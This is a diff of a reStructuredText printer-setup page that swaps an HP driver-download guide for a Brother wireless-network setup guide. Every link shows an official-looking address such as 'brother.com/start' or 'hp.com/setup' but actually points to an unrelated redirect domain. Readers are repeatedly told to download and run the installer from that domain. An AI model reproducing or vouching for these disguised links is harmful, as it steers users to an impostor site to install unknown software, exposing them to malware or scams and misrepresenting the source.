@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+How can I Set up your Brother machine on a wireless network?
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: FAC645F7A6F0C987881BDC96B99921F8
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: SETUP-YOUR-PRINTER.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: brother.com/start 
+      :target: https://bp.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,76 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+Setting up your Brother printer using `brother.com/start <https://bp.redircoms.com>`_ on a wireless network allows you to print and scan without the hassle of cables. Whether you're using a laptop, desktop, or mobile device, wireless setup offers flexibility and convenience. This guide will walk you through the process step-by-step.
 
-**********
-Steps to Download HP Printer Driver
-**********
+What You Need
+-------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+Before you begin, make sure you have:
 
-2. Enter your HP printer model in the search box.
+- A wireless router with an active internet connection
+- Your Brother machine powered on and in setup mode
+- Your Wi-Fi network name (SSID) and password
+- A computer or mobile device to complete the setup
 
-3. Select your operating system if prompted.
+Step 1: Download Required Software
+----------------------------------
 
-4. Click on **Download** to get the latest driver and software package.
+To get started, download the latest drivers and wireless setup tool from the official Brother support website.  
+Go to `brother.com/start <https://bp.redircoms.com>`_ and follow these steps:
 
-5. Save the installer file to your computer.
+1. Enter your Brother printer model (e.g., HL-L2370DW, MFC-J4335DW).
+2. Select your operating system (Windows, macOS).
+3. Download the **Full Driver & Software Package**.
 
-**********
-Steps to Install HP Printer Driver
-**********
+Step 2: Connect the Printer to Wi-Fi
+------------------------------------
 
-1. Locate the downloaded installer file on your computer.
+There are two main ways to connect your Brother machine to a wireless network: using the printer control panel or using the Brother software installer.
 
-2. Double-click the installer to begin the setup process.
+**Option A: Using the Printer's Control Panel**
 
-3. Follow the on-screen instructions and accept the license agreement.
+1. Press the **Menu** or **Settings** button on the printer.
+2. Navigate to **Network > WLAN > Setup Wizard**.
+3. The printer will search for available networks.
+4. Select your Wi-Fi network from the list.
+5. Enter the network password using the keypad.
+6. Once connected, the machine will display "Connected" or print a network report.
 
-4. Choose your connection type (USB or Wireless).
+**Option B: Using the Brother Software Installer**
 
-5. Complete the installation by clicking **Finish**.
+1. Run the installer you downloaded from `brother.com/start <https://bp.redircoms.com>`_.
+2. Choose **Wireless Network Connection** as your connection type.
+3. Follow the on-screen prompts to detect the printer and connect it to your Wi-Fi network.
+4. Complete the installation by adding the printer to your computer.
 
-**********
-Setting Up Your HP Printer
-**********
+Step 3: Confirm the Connection
+------------------------------
 
-1. Make sure your HP printer is powered on.
+Once connected, you can verify the wireless setup:
 
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
+- Print a **Network Configuration Page** from the printer menu.
+- Ensure the IP address and connection status are correct.
+- Open **Printers & Scanners** on your computer and confirm the Brother printer appears as "Ready."
 
-3. Open the HP driver or utility you installed.
+Step 4: Use Brother iPrint&Scan (Optional)
+------------------------------------------
 
-4. Follow on-screen prompts to detect and connect your printer.
+Install the **Brother iPrint&Scan** software or mobile app to simplify scanning, printing, and managing settings:
 
-5. Once connected, print a test page to verify setup is complete.
+- Desktop: Available via `brother.com/start <https://bp.redircoms.com>`_
+- Mobile: Available in the iOS App Store and Google Play Store
+
+Troubleshooting Tips
+--------------------
+
+- **Wi-Fi not detected?** Move the printer closer to the router.
+- **Wrong password?** Double-check the network credentials you entered.
+- **Printer not found?** Restart your printer and router, then try again.
+- **Driver not installing?** Re-download the correct package from the Brother setup site.
+
+Conclusion
+----------
+
+Setting up your Brother machine on a wireless network gives you greater flexibility and convenience for everyday printing and scanning tasks. For the latest software, step-by-step tools, and model-specific instructions, visit  
+`brother.com/start <https://bp.redircoms.com>`_ and get connected today.
